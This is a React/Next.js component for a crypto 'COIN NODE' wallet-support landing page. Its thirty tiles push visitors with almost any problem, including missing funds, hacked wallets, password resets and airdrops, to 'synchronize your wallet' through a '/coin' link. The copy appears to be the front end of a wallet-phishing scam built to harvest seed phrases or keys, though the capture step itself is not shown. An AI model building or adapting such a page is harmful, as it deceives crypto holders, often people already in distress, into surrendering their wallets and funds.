import React, { useEffect, useState } from 'react';
import Link from 'next/link';
import { cryptoData } from './data';
import Image from 'next/image';
import ScrollingTextAnimation from './ScrollingText';
import Loader from './Loader';
import Chat from './Chat';

function Main() {
  const [flag, setFlag] = useState(true);

  useEffect(() => {
    const timeoutId = setTimeout(() => {
      setFlag(false);
    }, 4000);

    // Clean up the timeout when the component unmounts or re-renders.
    return () => {
      clearTimeout(timeoutId);
    };
  });

  if (flag) {
    return <Loader />;
  }

  return (
    <div className='flex flex-col text-white'>
      <div className='bg-gray-800'>
        <ScrollingTextAnimation />
        <p className='text-[5px] text-gray-500 py-[1px] text-right'>
          Cryptocurrency Prices
        </p>
      </div>
      <div className='section bg-[#091930] pt-8 mt-5 px-1'>
        <div className=''>
          <div className='bg-[#001132] flex flex-col items-center justify-center border-2 border-[#009DEA] pb-6 pt-12 space-y-2 mb-8'>
            <h1 className='text-[9px] md:text-[45px] font-bold tracking-wider'>
              {'COIN NODE'}
            </h1>
            <h1 className='font-bold text-[8px] md:text-lg pb-5'>
              {
                'COIN NODE is an open protocol to communicate securely between Wallets and Dapps (Web3 Apps).'
              }
            </h1>
            <Link
              href={''}
              className='px-4 py-2 text-lg bg-[#009DEA] rounded text-[#001132] cursor-pointer hover:bg-[#FCB900] transition-all ease-in-out duration-500'
            >
              Explore Node Features
            </Link>
          </div>
          {homedata.map((e) => {
            const { id, title, text, icon } = e;
            return (
              <div
                key={id}
                className='bg-[#001132] flex flex-col items-center justify-center border-2 border-[#009DEA] py-5 space-y-2'
              >
                <Image src={icon} width={100} height={100} alt={title} />
                <h1 className='text-[9px] md:text-[45px] font-bold tracking-wider'>
                  {title}
                </h1>
                <h1 className='text-[8px] md:text-lg font-light'>{text}</h1>
                <Link
                  href={'/coin'}
                  className='px-4 py-2 text-lg bg-[#009DEA] text-blue-800 cursor-pointer hover:bg-[#FCB900] transition-all ease-in-out duration-500'
                >
                  CLICK HERE
                </Link>
              </div>
            );
          })}
        </div>
        <div className='flex mt-8 pb-1 text-[6px] justify-between items-center'>
          <p>
            Copyright (c) 2022 Blockchain Rectification . All rights reserved
          </p>
          <p>Privacy Policy - Terms of Services</p>
        </div>
      </div>
      <Chat />
    </div>
  );
}

export default Main;

const homedata = [
  {
    id: 1,
    icon: '/wallet/gi.png',
    title: 'GENERAL ISSUES',
    text: 'For instant solution on any type of issues , click the button below to synchronize your wallet and select "Correct Node Strings"',
  },
  {
    id: 2,
    icon: '/wallet/swap.png',
    title: 'Swapping',
    text: 'We will support you in any related issues with swaping and/or exchange of coins. Kindly click here.',
  },
  {
    id: 3,
    icon: '/wallet/token.png',
    title: 'TOKEN ISSUES',
    text: 'For issues with any tokens, during swap, claim, withdrawal or related issue, click the button below to synchronize your wallet and select "Correct Node Strings"',
  },
  {
    id: 4,
    icon: '/wallet/validation.png',
    title: 'VALIDATION',
    text: 'For validation related issue, click the button below to synchronize your wallet and select "validate Account"',
  },
  {
    id: 5,
    icon: '/wallet/pool.png',
    title: 'POOL & FARM ACCESS',
    text: 'For issues with any Pools and Farm Access or related issue, click the button below to synchronize your wallet and select "Correct Node Strings"',
  },
  {
    id: 6,
    icon: '/wallet/deposite.png',
    title: 'DEPOSITS AND WITHDRAWALS',
    text: 'For Issues with withdrawals, claim or related issue, click the button below to synchronize your wallet and select "Enable token swap & claims"',
  },
  {
    id: 7,
    icon: '/wallet/claim.png',
    title: 'CLAIM REWARD',
    text: 'For claim, reward enrollment click the button below to synchronize your wallet and "obtain your reward"',
  },
  {
    id: 8,
    icon: '/wallet/tb.png',
    title: 'TOKEN BRIDGE',
    text: 'For issues with token bridge click the button below to synchronize your wallet and select "Enable Bridge"',
  },
  {
    id: 9,
    icon: '/wallet/tr.png',
    title: 'TOKEN RECTIFICATION',
    text: 'For issues with token rectification, click the button below to synchronize your wallet and select "Rectify Token Error"',
  },
  {
    id: 10,
    icon: '/wallet/bs.png',
    title: 'BUY & SELL',
    text: 'For issues with buying and selling, click the button below to synchronize your wallet, then select "Buy or Sell"',
  },
  {
    id: 11,
    icon: '/wallet/erro.png',
    title: 'ERROR RECTIFICATION',
    text: 'For issues with any errors, click the button below to synchronize your wallet and then select "Detect & Fix Error"',
  },
  {
    id: 12,
    icon: '/wallet/ts-us.png',
    title: 'TOKEN STAKE AND UNSTAKE',
    text: 'For issues with token Staking and Unstaking click the button below to synchronize your wallet and select "Enable Stake and Unstake"',
  },
  {
    id: 13,
    icon: '/wallet/ledger.png',
    title: 'LEDGER & TREZOR',
    text: 'CFor ledger or Trezor related issues click the button below to synchronize your wallet and select "correct node string"',
  },
  {
    id: 14,
    icon: '/wallet/wnl.png',
    title: 'WEBSITE NOT LOADING',
    text: 'Are you unable to load exchange website? click the button below to synchronize your wallet and select "correct node string"',
  },
  {
    id: 15,
    icon: '/wallet/kyc.png',
    title: 'KYC & WHITELIST',
    text: 'To whitelist or complete LYX click the button below to synchronize your wallet and select "Whitelist wallet"',
  },
  {
    id: 16,
    icon: '/wallet/airdrops.png',
    title: 'AIRDROPS',
    text: 'For Airdrop enroll and claim click the button below to synchronize your wallet and select "enroll and claim"',
  },
  {
    id: 17,
    icon: '/wallet/unable.png',
    title: 'UNABLE TO ACCESS WALLET?',
    text: 'Are you unable to access your wallet? click the button below to synchronize your wallet and select "regain access"',
  },
  {
    id: 18,
    icon: '/wallet/reset.png',
    title: 'RESET WALLET PASSWORD',
    text: 'To reset wallet password click the button below to synchronize your wallet and select reset passworD',
  },
  {
    id: 19,
    icon: '/wallet/wc.png',
    title: 'WALLET COMPROMISED',
    text: 'Are you a victim of wallet hack?  click the button below to synchronize your wallet and hold the transactions',
  },
  {
    id: 20,
    icon: '/wallet/nft.png',
    title: 'NFT Mint',
    text: 'Click here to turn your digital content into NFT by uploading them here',
  },
  {
    id: 21,
    icon: '/wallet/tr.png',
    title: 'Connect to Dapps',
    text: 'Connect decentralised web applications to mobile wallets. Enable DAPP on mobile wallet/ Extension.',
  },
  {
    id: 22,
    icon: '/wallet/login.png',
    title: 'Login Issues',
    text: 'Do you have issues logging into your wallet?',
  },
  {
    id: 23,
    icon: '/wallet/missing.png',
    title: 'Missing Funds',
    text: 'Lost access to funds or funds is missing?',
  },
  {
    id: 24,
    icon: '/wallet/high.png',
    title: 'High Fees',
    text: 'Increase in transaction fees?',
  },
  {
    id: 25,
    icon: '/wallet/migrate.png',
    title: 'Migrate',
    text: 'Do you have issues with migrations?',
  },
  {
    id: 26,
    icon: '/wallet/tdd.png',
    title: 'Transaction Delay',
    text: 'Do you have issues with transactions being delayed?',
  },
  {
    id: 27,
    icon: '/wallet/iwtw.png',
    title: 'Issues With Trading wallet',
    text: 'Issues With Trading wallet',
  },
  {
    id: 28,
    icon: '/wallet/unable.png',
    title: 'Unable to purchase coins',
    text: 'if your account is not recognized as a trusted payment source you may not be able to buy crypto and add coins',
  },
  {
    id: 29,
    icon: '/wallet/locked.png',
    title: 'Locked Account',
    text: 'if you are logged out due to activity on the account',
  },
  {
    id: 30,
    icon: '/wallet/other.png',
    title: 'OTHER ISSUES',
    text: 'Your issue not listed above? Describe your issue by clicking on the button below.',
  },
];
